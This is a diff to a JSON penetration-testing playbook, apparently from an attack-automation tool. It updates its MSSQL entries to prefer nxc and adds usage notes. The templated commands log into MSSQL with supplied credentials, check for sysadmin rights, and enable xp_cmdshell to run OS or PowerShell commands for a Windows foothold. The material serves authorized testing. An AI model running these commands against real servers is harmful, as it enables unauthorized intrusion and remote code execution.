@@ -74,8 +74,9 @@
       "id": "mssql-login",
       "title": "MSSQL Login",
       "hypothesis": "MSSQL will often accept a domain credential or the `sa` account; an authenticated SQL prompt is the way into enumeration and, given enough privilege, command execution.",
-      "tool": "mssqlclient.py",
+      "tool": "nxc",
       "tools": [
+        "nxc",
         "mssqlclient.py",
         "impacket-mssqlclient"
       ],
@@ -99,12 +100,19 @@
       ],
       "commands": [
         {
-          "tool": "mssqlclient.py",
-          "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth"
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}'",
+          "note": "PREFERRED, from Kali: validate the credential against MSSQL in one shot. A [+] line means a working login (db.session); a (Pwn3d!) means the account is sysadmin, go straight to xp_cmdshell. Add --local-auth for a SQL login instead of a domain account, and -q 'SELECT ...' to run a query without an interactive prompt."
         },
         {
           "tool": "mssqlclient.py",
-          "run": "mssqlclient.py {{user}}:{{password}}@{{target}}"
+          "run": "mssqlclient.py {{domain}}/{{user}}:{{password}}@{{target}} -windows-auth",
+          "note": "Interactive SQL prompt (Windows/domain auth) when you want to browse databases by hand or stage xp_cmdshell manually."
+        },
+        {
+          "tool": "mssqlclient.py",
+          "run": "mssqlclient.py {{user}}:{{password}}@{{target}}",
+          "note": "Interactive SQL prompt with a local SQL login (no -windows-auth)."
         }
       ]
     },
@@ -112,8 +120,9 @@
       "id": "mssql-xp-cmdshell",
       "title": "MSSQL xp_cmdshell Command Execution",
       "hypothesis": "An MSSQL login with sysadmin rights can enable and invoke xp_cmdshell to run OS commands as the SQL service account, giving a Windows foothold.",
-      "tool": "mssqlclient.py",
+      "tool": "nxc",
       "tools": [
+        "nxc",
         "mssqlclient.py"
       ],
       "requires_all": [
@@ -135,8 +144,14 @@
       ],
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' -x 'whoami'",
+          "note": "PREFERRED, from Kali: nxc enables xp_cmdshell for you and runs the command in one shot, no manual sp_configure dance. Swap -x for -X to run PowerShell. An identity line (NT AUTHORITY\\SYSTEM or a service account) in the output is the Windows foothold. Needs the sysadmin role the (Pwn3d!) from MSSQL Login confirmed."
+        },
+        {
           "tool": "mssqlclient.py",
-          "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
+          "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
+          "note": "Manual fallback from the interactive mssqlclient prompt: enable xp_cmdshell, then invoke it. Use when nxc's -x is blocked or you are already sitting in the SQL session."
         }
       ]
     },
